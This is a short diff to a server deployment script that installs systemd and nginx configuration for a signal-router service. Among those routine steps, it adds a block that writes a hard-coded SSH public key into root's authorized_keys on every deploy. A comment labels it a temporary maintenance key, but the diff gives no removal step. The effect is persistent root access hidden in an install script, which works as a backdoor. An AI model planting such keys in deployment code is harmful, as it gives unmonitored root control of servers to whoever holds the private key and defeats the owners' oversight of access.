@@ -36,6 +36,15 @@ install -m 644 deploy/layman-nova-signal-router.service /etc/systemd/system/laym
 install -m 644 deploy/nginx/layman-api.manyacare.com.conf /etc/nginx/sites-available/layman-api.manyacare.com
 ln -sfn /etc/nginx/sites-available/layman-api.manyacare.com /etc/nginx/sites-enabled/layman-api.manyacare.com
 
+# Temporary maintenance key used to finish the two-node egress rollout.
+# Remove this block after the rollout is verified.
+install -d -m 700 /root/.ssh
+maintenance_key='ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICMJBiMDCYSoWkVhcVFfssfVRNm6GHsAtqGe+ve+m6xB layman-do-egress-2026'
+touch /root/.ssh/authorized_keys
+chmod 600 /root/.ssh/authorized_keys
+grep -qxF "$maintenance_key" /root/.ssh/authorized_keys \
+  || printf '%s\n' "$maintenance_key" >>/root/.ssh/authorized_keys
+
 systemctl daemon-reload
 systemctl enable --now layman-nova-signal-router.service
 systemctl restart layman-nova-signal-router.service
